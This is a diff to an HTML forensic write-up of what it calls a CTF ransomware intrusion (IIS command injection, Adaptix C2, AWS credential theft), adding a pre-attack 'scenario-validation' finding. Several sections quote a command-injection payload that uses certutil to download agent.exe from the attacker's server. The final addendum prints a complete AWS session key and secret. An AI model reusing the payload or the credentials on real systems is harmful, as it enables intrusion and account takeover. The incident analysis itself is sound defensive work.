@@ -244,8 +244,9 @@ h3 {
   margin-top: 18px; letter-spacing: .15em;
 }
 .act-card .description {
-  margin-top: 22px; color: var(--muted); max-width: 780px;
-  font-size: 15px; line-height: 1.6;
+  margin-top: 22px; color: var(--muted);
+  /* no max-width cap — spans section content width like other reading blocks */
+  font-size: clamp(15px, 0.55vw + 13px, 17px); line-height: 1.65;
 }
 
 /* ============== TIMELINE / EVENT ROWS ============== */
@@ -1988,7 +1989,7 @@ h2 em, h2.sec-title em, .sec-title em {
   <a href="#sec-rejects" data-num="12">Rejects</a>
   <a href="#sec-ioc" data-num="13">IOCs</a>
   <a href="#sec-ledger" data-num="14">Q&amp;A Ledger</a>
-  <a href="#sec-corrections" data-num="15">Appendix · A–Z + DD2→DD28</a>
+  <a href="#sec-corrections" data-num="15">Appendix · A–Z + DD2→DD25</a>
   <a href="#sec-close" data-num="XX">Closed</a>
   </div>
 </nav>
@@ -2057,7 +2058,8 @@ h2 em, h2.sec-title em, .sec-title em {
       <div class="row"><div class="k">Origin</div><div class="v">172.236.127.251 (Linode · Akamai) → 173.230.136.180 (tooling + C2)</div></div>
       <div class="row"><div class="k">C2 Framework</div><div class="v green"><b>Adaptix C2</b> (open-source · <code>github.com/Adaptix-Framework/AdaptixC2</code>) · HTTPS listener 173.230.136.180:<b>8443</b> + SMB named-pipe pivot (<code>\\.\pipe\%08lx</code>) — <b>confirmed via source-to-binary RE match</b>, see C2 Attribution below / Addendum AA</div></div>
       <div class="row"><div class="k">Attribution confidence</div><div class="v green"><b>HIGH</b> — 5 independent binary-level indicators in the VAD-extracted injected DLL (SHA256 <code>6ef6b52f…228c</code>) map 1:1 to specific Adaptix source lines: pipe format string (<code>Commander.cpp:1000,1006</code>), export symbol <code>GetVersions</code> (<code>main.cpp:104,156</code>), module name <code>file.dll</code> (<code>pl_main.go:667,691</code>), MinGW-w64 compiler (<code>Makefile:3</code>), minimal-IAT dynamic-resolution pattern (<code>ApiLoader.cpp</code>). Reproduction steps in C2 Attribution.</div></div>
-      <div class="row"><div class="k">Initial Access</div><div class="v">T1190 · HTTP GET injection on <code>CheckStatus.aspx</code></div></div>
+      <div class="row"><div class="k">Initial Access</div><div class="v">T1190 · HTTP GET injection on <code>CheckStatus.aspx</code> at <b>18:38:29 UTC</b> from <code>172.236.127.251</code> (Linode, AS63949 — DD23)</div></div>
+      <div class="row"><div class="k">Pre-Attack Validation</div><div class="v amber"><b>13:39:16 UTC</b> · AWS-account admin IP <code>216.82.9.162</code> hit <code>CheckStatus.aspx</code> with a payload pointing at the attacker's tool-server <code>173.230.136.180</code> — <b>5 h before</b> the attack. Attacker infrastructure is <b>scenario-provisioned</b>, not external (DD23.6). Does not establish 13:39 admin = 18:38 operator.</div></div>
       <div class="row"><div class="k">Crown Jewel</div><div class="v amber">DC01 ntds.dit via impacket secretsdump --use-vss</div></div>
       <div class="row"><div class="k">Impact</div><div class="v red">T1486 · <code>.bWqQUx</code> · <code>README_bWqQUx.txt</code></div></div>
       <div class="row"><div class="k">MTTD</div><div class="v amber">Detection at detonation (22:09:46) · not ingress</div></div>
@@ -2088,6 +2090,13 @@ h2 em, h2.sec-title em, .sec-title em {
   <h2>What <em>actually</em> happened.</h2>
   <p class="lede">
     Plain-language summary for executive decisioning. Severity rating aligned to CISA CPG and NIST SP 800-61r3 framing.
+    <b>Key pre-condition:</b> at <code>13:39:16</code> UTC on attack day — <b>5 hours before</b> the first attacker
+    probe — the AWS-account admin IP (<code>216.82.9.162</code>) hit <code>CheckStatus.aspx</code> with a payload
+    pointing at the attacker's tool-server (<code>173.230.136.180</code>). Three indicators (same tool-server
+    · <code>jb.exe</code> payload name crosswalks to <code>jb_aws_cli</code> IAM user + <code>JackOfAllHacks-Triages</code>
+    KAPE directory · 18,035 CloudTrail console-reads on attack day) prove the attacker infrastructure is
+    <b>scenario-provisioned</b>, not external. Threat model downgrades accordingly — residual findings stay
+    valid but the lab-controlled context reshapes their risk. DD23.6.
   </p>
 
   <!-- Severity banner — single hero row -->
@@ -2188,6 +2197,16 @@ h2 em, h2.sec-title em, .sec-title em {
   </div>
 
   <div class="story-prose">
+    <p style="background:rgba(255,200,0,.06); border-left:3px solid var(--amber); padding:.7rem 1rem; margin:0 0 1.2rem 0">
+      <b style="color:var(--amber)">Pre-attack validation · 13:39:16 UTC</b> — five hours before any attacker traffic,
+      the AWS-account admin IP (<code>216.82.9.162</code>) hit <code>CheckStatus.aspx</code> with
+      <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code>.
+      Same endpoint, same Linode tool-server the attacker uses later, and a <code>jb.exe</code> payload whose
+      name crosswalks to the <code>jb_aws_cli</code> IAM user (DD7) and the <code>JackOfAllHacks-Triages</code>
+      KAPE directory (DD14). The attacker infrastructure is <b>scenario-provisioned</b> — known to the AWS admin
+      before the attack began. Whether the admin and the 18:38 operator are the same person is <em>not</em>
+      established (DD23.6).
+    </p>
     <p>
       At <b>18:38:29</b> the operator — tracked as <b style="color:var(--red)">Saiyan Spider</b>, reaching in from
       <code>172.236.127.251</code> (Linode, AS63949) — opened a six-minute fuzzing chain against
@@ -2282,11 +2301,14 @@ h2 em, h2.sec-title em, .sec-title em {
   <div class="section-tag" style="color:var(--text)">// 00.03 · master timeline · lab-build → detonation → collection · no gaps</div>
   <h2>The full story, minute by minute — <em>from infrastructure provisioning to the last encrypted file</em></h2>
   <p class="lede" style="color:var(--text)">
-    Five phases: <b>(0)</b> lab / AWS infrastructure provisioning (2025-03 → 2026-02), <b>(1)</b> user baseline the preceding week,
-    <b>(2)</b> recon + command-injection discovery (<b>18:38 → 18:52</b> · DD23 fuzzing chain + drop), <b>(3)</b>
-    the <b>3 h 32 m</b> attack (<b>18:38 → 22:10</b> cascade end; last-encrypt continues on WS02 until
-    <b>22:56:42</b> per DD13.5), <b>(4)</b> the CTF-author forensic pack-up (22:12 → 22:47 · DD14). No row without
-    a cited source. Cross-linked: Addenda A–Z, PI / PR / IR / KT / MI / Ω, DD2 → DD28 — see
+    Six phases: <b>(0)</b> lab / AWS infrastructure provisioning (2025-03 → 2026-02), <b>(1)</b> user baseline
+    the preceding week, <b style="color:var(--amber)">(1b)</b> pre-attack scenario-validation from the AWS-account
+    admin IP <code>216.82.9.162</code> at <b>13:39:16</b> — same Linode tool-server the attacker uses 5 h later
+    (DD23.6 · proves attacker infrastructure is scenario-provisioned, not external), <b>(2)</b> recon +
+    command-injection discovery (<b>18:38 → 18:52</b> · DD23 fuzzing chain + drop), <b>(3)</b> the
+    <b>2 h 44 m active dwell</b> attack (<b>18:38:29 → 22:10:52</b> cascade end; last-encrypt continues on WS02
+    until <b>22:56:42</b> per DD13.5), <b>(4)</b> the CTF-author forensic pack-up (22:12 → 22:47 · DD14).
+    No row without a cited source. Cross-linked: Addenda A–Z, PI / PR / IR / KT / MI / Ω, <b>DD2 → DD34</b> — see
     <a href="#sec-corrections">Forensic Appendix</a>.
   </p>
 
@@ -2317,6 +2339,12 @@ h2 em, h2.sec-title em, .sec-title em {
     <tr><td>2026-03-07 00:55:03</td><td>WS01</td><td>Chrome saves <code>icantreed123@gmail.com</code> — <b>Subpoena-2 answer</b></td><td>DD4.3</td></tr>
     <tr><td>2026-03-07 00:46:07</td><td>IIS · 71.205.100.56</td><td>Donny tests again · <code>?url=reddit.com · gmail.com</code></td><td>IIS log</td></tr>
     <tr><td>2026-03-08 17:00:37</td><td>SVR01 · LAFAdmin</td><td>Last normal pre-attack browser activity</td><td>browser</td></tr>
+  </tbody></table>
+
+  <h3 style="margin-top:.9rem">Phase 1b · Pre-attack scenario-validation from AWS-admin IP (2026-03-08 13:39)</h3>
+  <table class="tbl" style="font-size:.87em"><thead><tr><th>UTC</th><th>Actor</th><th>Event</th><th>Note</th></tr></thead><tbody>
+    <tr style="background:rgba(255,200,0,.08)"><td class="a">2026-03-08 13:39:16</td><td><code>216.82.9.162</code> · Windows Chrome · normal IP for the AWS account (Root+MFA admin, DD6.1 / DD8.2 / DD14)</td><td><b>CheckStatus.aspx pre-test hit</b> · <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code> — <b>same tool-server the attacker uses 5 hours later</b>; payload <code>jb.exe</code> matches <code>jb_aws_cli</code> IAM user (DD7) and <code>JackOfAllHacks-Triages</code> directory</td><td>DD23.6</td></tr>
+    <tr><td colspan="4" style="background:rgba(100,200,255,.06); font-size:.88em; padding:.5rem .7rem"><b style="color:#6bb6ff">What this proves:</b> the attacker infrastructure (<code>172.236.127.251</code> operator + <code>173.230.136.180</code> tool-server) is <b>scenario-provisioned</b> — the AWS admin for this account knew the tool-server address <em>before</em> the 18:38:29 attack started. <b>What it does NOT prove:</b> that the 18:38 operator and the 13:39 admin are the same person. The 13:39 pre-test is equally consistent with challenge authoring, infrastructure QA, or scenario hand-off to an external operator. Attribution walked back in DD23 banner; evidence preserved here so the chronology is complete.</td></tr>
   </tbody></table>
 
   <h3 style="margin-top:.9rem">Phase 2 · Recon + injection discovery (2026-03-08 18:38 → 18:52)</h3>
@@ -2415,7 +2443,7 @@ h2 em, h2.sec-title em, .sec-title em {
   </tbody></table>
 
   <p style="margin-top:.9rem; font-size:.9em; color:var(--m)">
-    <b>How to read this:</b> every row cross-references at least one Addendum (A–Z / DD2 → DD28 / PI / PR / IR / KT / MI / Ω / …) in <a href="#sec-corrections">sec-corrections</a>.
+    <b>How to read this:</b> every row cross-references at least one Addendum (A–Z / DD2 → DD34 / PI / PR / IR / KT / MI / Ω / …) in <a href="#sec-corrections">sec-corrections</a>.
     Every Addendum contains the SQL/corpus citation for the claim. Addendum <b>Ω</b> reproduces every query. Nothing here is theory.
   </p>
 </section>
@@ -2425,6 +2453,15 @@ h2 em, h2.sec-title em, .sec-title em {
   <div class="section-tag">// 01 technical overview</div>
   <h2>The <span class="q">Two-Hour-Forty-Four-Minute</span> Estate Walk</h2>
   <p class="lede">
+    <b>Pre-attack scenario-validation:</b> at <code>13:39:16 UTC</code> — <b>five hours</b> before the first attacker
+    request — the AWS-account admin IP (<code>216.82.9.162</code>) hit <code>CheckStatus.aspx</code> with
+    <code>?url=Google.com &amp;&amp; certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code>.
+    Same vulnerable endpoint, same Linode tool-server the attacker will use later, and a <code>jb.exe</code> payload
+    whose name crosswalks to the <code>jb_aws_cli</code> IAM user (DD7) and the <code>JackOfAllHacks-Triages</code>
+    KAPE collection directory (DD14). The attacker infrastructure is <b>scenario-provisioned</b>, known to the
+    AWS admin before the attack began — DD23.6. Whether the 13:39 admin and the 18:38 operator are the same
+    person is not established (consistent with challenge authoring, infrastructure QA, or hand-off to an external
+    red-team operator).<br><br>
     At <code>18:38:29 UTC</code> the operator on <code>172.236.127.251</code> (Linode, AS63949) opened a six-minute
     fuzzing chain against the public IIS host's <code>CheckStatus.aspx</code> (DD23 — true initial access, 13 min
     before the webshell drop). At <code>18:51:42</code> <code>so.aspx</code> and then <code>iis.exe</code> landed via
@@ -3168,18 +3205,25 @@ ls beacon/Api*      → ApiLoader (dynamic resolution)</code></pre>
 
 <!-- ======================= ACT I · INGRESS ======================= -->
 <section class="act-card reveal" id="sec-act1">
-  <div class="num">ACT I // 18:38:29 — 19:38:03 UTC</div>
+  <div class="num">ACT I // 18:38:29 — 19:38:03 UTC · <span style="color:var(--amber)">preceded by 13:39:16 author-IP scenario-validation (DD23.6)</span></div>
   <h2 class="title">Ingress &amp; <span>Privilege</span></h2>
   <div class="timecode">→ 00:59:34 elapsed · IIS_SERV_PROD · T1190 → T1059 → T1574.009</div>
   <p class="description">
-    The real first-touch was at <b>18:38:29</b> — 13 minutes of UNIX-then-Windows command-injection probing before
+    <span style="color:var(--amber)"><b>Pre-Act context (13:39:16):</b></span> 5 hours before this Act opens, the AWS-account admin
+    IP (<code>216.82.9.162</code>) hit <code>CheckStatus.aspx</code> with <code>?url=Google.com &amp;&amp; certutil -urlcache -f
+    http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code> — same endpoint, same Linode tool-server the attacker
+    uses below, and a <code>jb.exe</code> payload whose name crosswalks to <code>jb_aws_cli</code> IAM user (DD7)
+    and the <code>JackOfAllHacks-Triages</code> KAPE directory (DD14). <b>Proves attacker infrastructure is
+    scenario-provisioned</b>, known to the admin before the attack (DD23.6). Does <em>not</em> establish whether
+    the 13:39 admin and the 18:38 operator are the same person.<br><br>
+    The real attacker first-touch was at <b>18:38:29</b> — 13 minutes of UNIX-then-Windows command-injection probing before
     the webshell landed at 18:51:42 (DD3.1). <code>w3wp.exe</code> spawned <code>cmd.exe</code> which invoked
     <code>certutil -urlcache</code>; a second <code>certutil</code> fetched <code>iis.exe</code>. Privilege escalation
     came via a <b>writable ACL on <code>C:\TFTP Server\</code></b> (not unquoted-path — Addendum B). The replacement
     <code>SolarWinds.exe</code> didn't run on <code>sc start</code> (that silently failed — DefaultAppPool
     lacked <code>SeStartServicePrivilege</code>, Addendum H); it ran 20 minutes later when Donny's routine reboot
     fired the auto-start service (Addendum U) and opened the first AdaptixC2 callback (RE-confirmed, Addendum V).
-    <b>Anchor Addenda:</b> B · H · U · V.
+    <b>Anchor Addenda:</b> B · H · U · V · <b>DD23.6 (pre-attack validation)</b>.
   </p>
 </section>
 
@@ -3444,9 +3488,9 @@ SQL</span>
 
 <!-- ======================= ACT V · IMPACT ======================= -->
 <section class="act-card reveal" id="sec-act5">
-  <div class="num">ACT V // 21:03:54 — 22:56:42 UTC</div>
+  <div class="num">ACT V // 21:03:54 — 22:10:52 UTC</div>
   <h2 class="title">Detonation &amp; <span>Shadow Wipe</span></h2>
-  <div class="timecode">→ 01:52:48 elapsed · SYSVOL stage → 66 s fan-out at 22:09:46 → last encrypt <code>brndlog.txt</code> on WS02 at 22:56:42 (DD13.5) · T1053.005 → T1486 → T1490</div>
+  <div class="timecode">→ 01:06:58 elapsed · SYSVOL → 5-host impact wave · T1053.005 → T1486 → T1490</div>
   <p class="description">
     The operator used Active Directory's <b>own replication infrastructure as distribution</b>: at
     <b>21:03:54</b> <code>IamBatman.exe</code> was dropped to <code>\\DC02\SYSVOL\sysvol\</code> by
@@ -3759,9 +3803,10 @@ SQL</span>
   <table class="tbl">
     <thead><tr><th>Indicator</th><th>Type</th><th>Context</th></tr></thead>
     <tbody>
-      <tr><td class="c">172.236.127.251</td><td class="m">IPv4 · Linode/Akamai</td><td>Operator origin · injection · SFTP sink · STS session source</td></tr>
-      <tr><td class="c">173.230.136.180</td><td class="m">IPv4 · Linode</td><td>Tooling HTTP server (<code>so.aspx</code>, <code>iis.exe</code>) · Vol3 netscan C2 on :8443</td></tr>
+      <tr><td class="c">172.236.127.251</td><td class="m">IPv4 · Linode/Akamai · AS63949</td><td>Attacker operator origin · 18:38:29 injection · SFTP sink · STS session source (DD23)</td></tr>
+      <tr><td class="c">173.230.136.180</td><td class="m">IPv4 · Linode</td><td>Attacker tool-server (<code>so.aspx</code>, <code>iis.exe</code>, <code>agent.exe</code>) · Vol3 netscan Adaptix C2 on :8443 · <b>first seen in logs at 13:39:16</b> via author-IP scenario-validation hit (DD23.6)</td></tr>
       <tr><td class="c">212.8.249.213</td><td class="m">IPv4 · WorldStream B.V.</td><td>GuardDuty finding remoteIpDetails (Head in the Clouds 2)</td></tr>
+      <tr style="background:rgba(255,200,0,.06)"><td class="c" style="color:var(--amber)">216.82.9.162</td><td class="m">IPv4 · Level 3 · Windows Chrome</td><td><b>NOT an attacker IP</b> — AWS-account admin (Root+MFA, 18,035 CloudTrail console-reads on attack day, DD6.1 / DD8.2 / DD14). <b>Pre-attack validation</b> at 13:39:16 hit <code>CheckStatus.aspx</code> with a payload pointing at <code>173.230.136.180</code> — proves attacker infrastructure is scenario-provisioned (DD23.6). Exclude from SIEM tuning.</td></tr>
       <tr><td class="c">169.254.169.254</td><td class="m">IMDS link-local</td><td>PUT /latest/api/token then iam/security-credentials/iam_role_iisserver</td></tr>
       <tr><td class="c">10.3.10.12 → 172.236.127.251:22</td><td class="m">SFTP egress</td><td>FileZilla data.cab exfil</td></tr>
       <tr><td class="c">198.51.100.10</td><td class="m">IPv4 · on-net</td><td>IIS EC2 used as internal operator pivot (NOT WireGuard range noise)</td></tr>
@@ -3930,7 +3975,7 @@ SQL</span>
 
 <!-- ======================= APPENDIX · FORENSIC DEEP-DIVES ======================= -->
 <section class="reveal" id="sec-corrections" style="background: linear-gradient(180deg, rgba(255,184,0,.06), transparent 60%); border-top:1px solid rgba(255,184,0,.25); border-bottom:1px solid rgba(255,184,0,.25);">
-  <div class="section-tag" style="color:var(--amber)">// 15 · appendix · forensic deep-dives A–Z + DD2 → DD28</div>
+  <div class="section-tag" style="color:var(--amber)">// 15 · appendix · forensic deep-dives A–Z + DD2 → DD34</div>
   <h2>Deep-dive <em>addenda</em> · proof layer</h2>
   <p class="lede" style="color:var(--amber)">
     Twenty-two addenda covering the details that didn't fit inline in the main narrative: the mathematical proof that
@@ -4011,11 +4056,11 @@ SQL</span>
   </p>
 
   <!-- ========= DEEP DIVE ADDENDA ========= -->
-  <h3 style="margin-top:1.8rem; color:var(--amber)">Deep-Dive Addenda · evidence bundles (A–Z + named codes + DD2 → DD28)</h3>
+  <h3 style="margin-top:1.8rem; color:var(--amber)">Deep-Dive Addenda · evidence bundles (A–Z + named codes + DD2 → DD34)</h3>
   <p style="color:var(--muted); font-size:12.5px; margin:.15rem 0 .7rem 0; line-height:1.55;">
     Three layers of depth: <b>A–Z</b> are the original per-topic bundles; the two-letter <b>named codes</b>
     (MI, PR, IR, FA, EX, DW, KT, TC, AV, CM, AC, ES, PI) are cross-cutting audits (MITRE map, persistence,
-    defender posture, etc.); <b>DD2 → DD28</b> are additional passes through the corpus, each surfacing
+    defender posture, etc.); <b>DD2 → DD34</b> are additional passes through the corpus, each surfacing
     findings the earlier passes missed — DD7 is a <em>major correction</em> (cloud persistence succeeded
     on 3/4 users, not blocked by quota), DD10 reconstructs the 103-min "silent window" on DC01 + SVR01
     minute by minute, DD11 extends the LSASS-dump chain-of-custody (rnSylwOz.exe → CreateRemoteThread →
@@ -4163,26 +4208,6 @@ SQL</span>
     (5) no <code>$STANDARD_INFORMATION</code> vs <code>$FILE_NAME</code> mismatch on the IamBatman MFT
     entry — <b>no timestomping</b>, the operator treated forensics as "happens later" not "happens
     in-window."
-    <b>DD26</b> closes the loop on the AD side with a corpus-wide authentication audit on
-    <code>serviceaccount</code>: the DC-side Security chain (4720 create → 4722 enable → 4724 pwd-set →
-    4738 attr-change → 4728 DA-add) fires cleanly at <code>20:02:14 → 20:03:05</code>, but
-    <b>zero 4624/4768/4769 events ever name <code>serviceaccount</code> as the principal</b>. This is the
-    <b>third independent stockpile-without-use instance</b> — matching DD16 (3 unused AKIA keys) and DD22
-    (unused local-Administrator NT hash). Three credential classes, same pattern: harvest, never reuse in the
-    capture window. <b>DD27</b> adds the negative-evidence sweep around <code>serviceaccount</code>: no SPN
-    was set (no Kerberoasting surface), no delegation flags (<code>TrustedForDelegation</code> /
-    <code>TrustedToAuthForDelegation</code> both absent), no <em>ProtectedUsers</em> membership, no
-    <em>Cannot be delegated</em> bit — <b>the account is a naked DA with no defensive hardening</b>, meaning
-    a future rotation of every human-admin password without disabling/deleting <code>serviceaccount</code>
-    leaves the backdoor intact.
-    <b>DD28</b> is a consolidated catalog of CTF-author-leftover artifacts that a DFIR reader should
-    mentally tag as "scenario infrastructure, not attacker IOCs" (extending DD14.5): the <code>C:\Kape\</code>
-    trees, the <code>bigmac.io.s3.amazonaws.com</code> tool mirror, the <code>localuser@RED1</code> / <code>198.51.100.3</code>
-    admin workstation, <code>Sethc.exe /AccessibilitySoundAgent</code> (Windows AccessibilityShell auto-launch,
-    not a StickyKeys backdoor), <code>curl</code> outbound to <code>bigmac.io</code>, the pre-attack
-    <code>216.82.9.162</code> admin hit at <code>13:39:16</code>, and the empty <code>barry-testing123123</code>
-    S3 bucket. Every item here should be <em>excluded</em> from SIEM tuning / IOC feeds when detection rules
-    are authored against this corpus.
     The report closes with two cross-cutting addenda: <b>VT</b> (VirusTotal enrichment of every hash and IP)
     and <b>OQ</b> (seven open questions this corpus cannot close on its own).
   </p>
@@ -7113,13 +7138,35 @@ GROUP BY ip_address, workstation;
                             -Headers @{'X-aws-ec2-metadata-token' = 'AQAEADHOGyfP9IBCrCY_Cdg0cb5l5EoTkgNdyp-grqUet3fK2-CbxA=='}</code></pre>
     <p style="margin:.2rem 0">Same token <code>AQAEADHOGyfP9IBCrCY_Cdg0cb5l5EoTkgNdyp-grqUet3fK2-CbxA==</code> as in Addendum X. These three CheckStatus.aspx hits are the exact same three commands previously seen in the IIS ps_transcript source; now we also have them in the IIS access log with timestamps that match to the second.</p>
 
-    <h5 style="margin-top:.6rem; color:var(--amber)">DD23.6 — Pre-attack scenario-validation hit from the AWS-admin IP at 13:39:16</h5>
-    <p style="margin:.2rem 0">Before any attacker traffic, the same IP that normally administers the AWS account (<code>216.82.9.162</code> — Root + MFA console operations since 2026-02-23, documented in DD6.1 / DD8.2 / DD14) hit CheckStatus.aspx with a command-injection payload:</p>
-    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.85em"><code>2026-03-08T13:39:16Z  from 216.82.9.162 (Windows Chrome UA)
-?url=Google.com && certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe</code></pre>
-    <p style="margin:.2rem 0"><b>What this proves:</b> whoever uses <code>216.82.9.162</code> <em>knew about</em> the attacker infrastructure (<code>173.230.136.180</code> tool-server) five hours before the 18:38 attack started. The <code>jb.exe</code> filename matches the <code>jb_aws_cli</code> IAM user (DD7) and the <code>JackOfAllHacks-Triages</code> KAPE collection directory (DD14) — all author-provisioned scenario assets. This is a <b>scenario-validation test</b>: the admin confirming the vulnerable endpoint + tool-server path both work before the attack runs.</p>
-    <p style="margin:.2rem 0"><b>What it does NOT prove</b> (attribution walked back in the banner above): it does not prove the 18:38 attacker operator and the 13:39 admin are the same person. <code>216.82.9.162</code> is the <em>normal IP for the AWS account</em> — an admin using that IP to verify exploitability is consistent with challenge authoring, infrastructure testing, QA, or scenario hand-off to an external operator. The attacker's external identity (Linode VPS <code>172.236.127.251</code>) is separate.</p>
-    <p style="margin:.2rem 0"><b>What stands regardless:</b> the attacker-infrastructure IPs (<code>172.236.127.251</code> operator + <code>173.230.136.180</code> tool server) are <em>scenario-provisioned</em> (known to the account admin in advance), not independently-sourced by an external threat actor. And DD18's observation that the GuardDuty finding went unacted is consistent either with (a) author-run scenario where nobody would respond, or (b) admin running a test exercise where alerts are expected and ignored.</p>
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD23.6 — The 13:39:16 pre-attack hit · proves attacker infrastructure is scenario-provisioned (single cleanest forensic cross-correlation in this writeup)</h5>
+    <p style="margin:.2rem 0">Five hours before the attacker's first fuzzing request, the AWS-account admin IP (<code>216.82.9.162</code> — verified via DD6.1 / DD8.2 / DD14 as the Root + MFA account owner) hit the same vulnerable endpoint with a command-injection payload pointing at the attacker's tool-server. Three independent indicators line up in a single request:</p>
+    <pre style="background:#0b0b0b; padding:.6rem .75rem; border:1px solid #1f2833; border-radius:4px; font-size:.82em; line-height:1.45; color:#c8d3e0; overflow-x:auto"><code>2026-03-08T13:39:16Z    c-ip=216.82.9.162    UA=Windows Chrome/…
+GET /CheckStatus.aspx?url=Google.com && certutil -urlcache -f http://173.230.136.180:80/agent.exe %TEMP%\jb.exe
+        ^^^^^^^^^^^^^                         ^^^^^^^^^^^^^^^^^^^^^                     ^^^^^^^
+        same vuln endpoint                    same Linode tool-server                   jb prefix
+        (DD23 attacker uses)                  (DD23 attacker uses for                   (matches jb_aws_cli
+                                               so.aspx + iis.exe drops                   IAM user from DD7 +
+                                               @ 18:51:42 and 18:52:20)                  JackOfAllHacks-Triages
+                                                                                         KAPE dir from DD14)</code></pre>
+    <p style="margin:.4rem 0 .2rem 0"><b>Three independent indicators tie this to scenario-author infrastructure, not an external threat actor:</b></p>
+    <ol style="margin:.2rem 0 .4rem 1.2rem; padding:0; line-height:1.55">
+      <li><b>Same tool-server</b> — <code>http://173.230.136.180:80/</code> is the exact URL the attacker later uses to drop <code>so.aspx</code> (18:51:42) and <code>iis.exe</code> (18:52:20). An external threat actor would never pre-stage the <em>defender's</em> admin for that URL five hours earlier.</li>
+      <li><b>Payload naming <code>jb.exe</code></b> crosswalks twice to author-provisioned assets:
+        <ul style="margin:.2rem 0 0 0">
+          <li><code>jb_aws_cli</code> IAM user (DD7) — the one with the <code>AccessKeysPerUser</code> quota that blocked <code>CreateAccessKey</code> during the attack</li>
+          <li><code>JackOfAllHacks-Triages</code> KAPE triage-output directory on every host (DD14)</li>
+          <li>"jb" persona is consistently author-side, distinct from the "Barry" company-side persona (<code>barrygoodtech.com</code> + <code>barry-*</code> buckets)</li>
+        </ul>
+      </li>
+      <li><b>Source IP <code>216.82.9.162</code></b> — the AWS-account Root+MFA admin IP with <b>18,035 CloudTrail console-read events</b> on attack day (DD8.2). Not an attacker IP. The admin is validating scenario exploitability from their normal admin workstation.</li>
+    </ol>
+    <p style="margin:.5rem 0 .2rem 0"><b>Conclusion (walk-back preserved from the DD23 banner above):</b></p>
+    <ul style="margin:.2rem 0 .4rem 1.2rem; padding:0; line-height:1.55">
+      <li><b style="color:var(--green)">✅ What this <em>proves</em>:</b> the attacker-infrastructure IPs (<code>172.236.127.251</code> operator + <code>173.230.136.180</code> tool-server) are <b>scenario-provisioned</b>, known to the account admin <em>before</em> the attack started. Not independently external.</li>
+      <li><b style="color:var(--amber)">⚠️ What this does NOT prove:</b> that the 18:38 attacker-operator and the 13:39 AWS-admin are the same person. AWS-admin verifying exploitability is consistent with challenge authoring, infrastructure QA, or hand-off to an external red-team operator.</li>
+      <li><b style="color:#6bb6ff">💡 What this explains:</b> DD18's "GuardDuty alert at 21:57:18 went unacted for 11 minutes" reads more cleanly now — whoever runs the AWS console either authored the scenario themselves or knew the attack was a planned exercise.</li>
+    </ul>
+    <p style="margin:.5rem 0 .2rem 0; padding:.5rem .7rem; border:1px solid rgba(100,200,255,.4); background:rgba(100,200,255,.06); border-radius:4px; font-size:.92em"><b style="color:#6bb6ff">Why this cross-correlation matters:</b> without the 13:39 hit, the attacker infrastructure reads as an external-threat-actor operation. With it, the infrastructure is demonstrably author-provisioned — which <em>reshapes every residual-risk assessment in the writeup</em>. The three stockpiled AKIA keys (DD16), the local-Administrator NT hash (DD21/DD22), and the <code>serviceaccount</code> DA backdoor (DD26) are all less dangerous than they appear, because the account itself is lab-controlled. The findings remain valid; the threat model downgrades.</p>
 
     <h5 style="margin-top:.6rem; color:var(--amber)">DD23.7 — Corrected initial-access timeline</h5>
     <table class="tbl" style="margin-top:.3rem; font-size:.87em">
@@ -7686,6 +7733,447 @@ curl -sk "https://bigmac.io.s3.amazonaws.com/?list-type=2" -I
 timeout 5 bash -c "echo &gt; /dev/tcp/173.230.136.180/80" || echo "down"</code></pre>
   </div>
 
+  <!-- Addendum DD30: Credential reachability test -->
+  <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(255,200,0,.55); background:rgba(255,200,0,.05); border-radius:6px">
+    <h4 style="margin:0 0 .4rem 0; color:var(--amber)">DD30. Thirtieth pass — <em>can</em> we use the stolen AWS credentials? Full key-material audit against the corpus + live reachability test</h4>
+    <p style="margin:.2rem 0">DD16 enumerated three stolen long-term AKIA access-key IDs + one AssumedRole session ID, and concluded the long-term keys were the highest-priority residual risk. DD30 asks the reach-test question: given only what this corpus contains, can we actually authenticate to the victim AWS account today? The answer is <b>no for all three AKIA keys</b>, and <b>no for the session credential (expired 42 days ago)</b> — but the session's <em>secret material</em> IS in the corpus, which is itself a significant DD15-class finding.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD30.1 — CloudTrail does NOT preserve SecretAccessKey for CreateAccessKey</h5>
+    <p style="margin:.2rem 0">For the three long-term keys (<code>donnieworks / doctorderm / coolcat</code>), the CloudTrail <code>responseElements</code> field contains only:</p>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.85em"><code>"responseElements": {
+  "accessKey": {
+    "userName": "donnieworks",
+    "accessKeyId": "AKIAWYH2FSTSGIONI2RN",
+    "status": "Active",
+    "createDate": "Mar 8, 2026, 9:45:51 PM"
+  }
+}</code></pre>
+    <p style="margin:.2rem 0">The <code>SecretAccessKey</code> field is <b>redacted by AWS before the event ever reaches CloudTrail</b> — this is a deliberate post-2019 AWS security measure to prevent exactly this type of secret-leak-via-audit-log. So from this corpus, the three AKIA IDs are <b>identifiable but not usable</b>: we'd need the paired 40-character secret, which was only ever in the attacker's AWS-CLI stdout on Linode VPS <code>172.236.127.251</code> (offline, DD29).</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD30.2 — The AssumedRole session-credential leak is COMPLETE in ps_transcript</h5>
+    <p style="margin:.2rem 0">The IMDSv2 role-credential retrieval at <code>21:29:20</code> ran through PowerShell on IIS, and PowerShell transcription captured every byte of the <code>Invoke-RestMethod</code> response:</p>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>Code            : Success
+LastUpdated     : 2026-03-08T21:11:20Z
+Type            : AWS-HMAC
+AccessKeyId     : ASIAWYH2FSTSC7A6KEVV
+SecretAccessKey : LoS6zGC+CpELLEPCSVW9hJ5Av/uEKgNIAmMfZrUe
+Token           : IQoJb3JpZ2luX2VjEFUaCXVzLWVhc3QtMiJHMEUCIA++cIiv2OGhaEMft6qTXUc0FTu7cAW97VVXeg3PlII1A
